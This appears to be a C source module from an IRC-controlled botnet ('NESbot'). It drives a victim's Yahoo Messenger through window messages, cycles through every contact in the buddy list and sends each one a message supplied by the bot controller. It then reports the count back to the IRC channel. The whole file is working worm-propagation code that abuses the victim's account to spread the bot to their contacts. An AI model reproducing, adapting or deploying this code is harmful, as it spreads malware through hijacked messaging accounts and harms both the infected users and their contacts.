#include "../h/includes.h"
#include "../h/externs.h"

//original idea by OG, thanks for the help bro :)  --carve

int yMsgCount;
extern char logo[];

bool SendMessageToYahoo(char *YahooMessage)
{
   HWND hwndYahooWindow, hwndClass;
   HWND hwndMessage, hwndButton;

   if (!(hwndYahooWindow = FindWindow("YSearchMenuWndClass", NULL))) { return false; }

   if (IsWindow(hwndYahooWindow))
   {
      SendMessage(hwndYahooWindow, WM_COMMAND, 32891, 0);

      if (!(hwndClass = FindWindowEx(hwndYahooWindow, 0, "IMClass", NULL))) { return false; }

      if (IsWindow(hwndClass))
      {
         if (!(hwndMessage = FindWindowEx(hwndClass, 0, "YIMInputWindow", NULL))) { return false; }

         SendMessage(hwndMessage, WM_SETTEXT, 0, (LPARAM)YahooMessage);
         Sleep(100);
      }

      if (IsWindow(hwndClass))
      {
         if (!(hwndButton = FindWindowEx(hwndClass, 0, "Button", "&Send"))) { return false; }

         SendMessage(hwndButton, WM_LBUTTONDOWN, 0, 0);
         SendMessage(hwndButton, WM_LBUTTONUP, 0, 0);
         Sleep(50);
      }
   }

   if (IsWindow(hwndYahooWindow))
   {
      SendMessage(hwndYahooWindow, WM_CLOSE, 0, 0);
      return true;
   }
   return false;
}

DWORD WINAPI Yahoo(LPVOID param)
{
	char YMessage[512]; //= "Testing";
    NTHREAD yah = *((NTHREAD *)param);
	NTHREAD *yahs = (NTHREAD *)param;
	yahs->gotinfo = TRUE;
	IRC* irc=(IRC*)yah.conn;

	HWND hwndYahooWindow, hwndWindow;

	strncpy(YMessage,yah.data1,sizeof(YMessage));

   if (!(hwndYahooWindow = FindWindow("YahooBuddyMain", NULL))) { return 0; }
   
   if (IsWindow(hwndYahooWindow))
   {
      SendMessage(hwndYahooWindow, WM_COMMAND, 32891, 0);

      if (!(hwndWindow = FindWindowEx(hwndYahooWindow, 0, "YTopWindow", NULL))) { return 0; }

      if (IsWindow(hwndWindow))
      {
         //hwndWindow = FindWindowEx(hwndWindow, 0, "YTabListManager", NULL);
         hwndWindow = FindWindowEx(hwndWindow, 0, "ATL:0084FD68", NULL);
         hwndWindow = FindWindowEx(hwndWindow, 0, "SysListView32", NULL);

         if (IsWindow(hwndWindow))
         {
            for (int i = ListView_GetSelectionMark(hwndWindow); i >= 0; --i)
            {
               SendMessage(hwndWindow, WM_KEYDOWN, VK_UP, 0);
               SendMessage(hwndWindow, WM_KEYUP, VK_UP, 0);
            }

            for ( i = 0; i <= ListView_GetItemCount(hwndWindow); ++i )
            {
               SendMessage(hwndWindow, WM_KEYDOWN, VK_DOWN, 0);
               SendMessage(hwndWindow, WM_KEYUP, VK_DOWN, 0);
               SendMessage(hwndWindow, WM_KEYDOWN, VK_RETURN, 0);
               SendMessage(hwndWindow, WM_KEYUP, VK_RETURN, 0);
			   sprintf(YMessage, "%s", YMessage);
               SendMessageToYahoo(YMessage);
			   yMsgCount++;
            }
         }
      }
   }
   	if ( yMsgCount > 1 )
	{
	irc->pmsg(InfoChan, "[\2NES\2bot] \2»\2› [\2Y\2ahoo] - Msg & File Sent To: %s Contacts.", yMsgCount);
   	}
	clearthread(yah.threadnum);
	ExitThread(0);
   return 0;
}
